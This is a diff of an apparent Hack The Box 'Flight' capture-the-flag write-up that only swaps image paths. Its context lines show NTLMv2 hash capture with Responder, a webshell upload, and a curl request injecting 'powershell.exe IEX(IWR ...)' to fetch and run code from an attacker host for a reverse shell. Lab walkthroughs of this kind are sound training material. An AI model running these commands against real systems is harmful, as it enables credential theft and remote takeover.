@@ -500,7 +500,7 @@ sudo responder -I tun0 -wPv
 
 Wait a little bit and you will see the NTLMv2 hash for C.Bum come across the network:
 
-<figure><img src="../../../.gitbook/assets/image (24) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Time to crack this hash:
 
@@ -548,7 +548,7 @@ putting file webshell.php as \flight.htb\webshell.php (62.9 kb/s) (average 62.9 
 
 * By navigating to /flight.htb/webshell.php, we can get to the webshell!
 
-<figure><img src="../../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -632,7 +632,7 @@ curl http://flight.htb/hacker.php -A 'powershell.exe IEX(IWR http://10.10.14.48:
 
 Congrats, you have now caught a fully-interactive Windows reverse shell!
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### Obtaining C.Bum Session
 
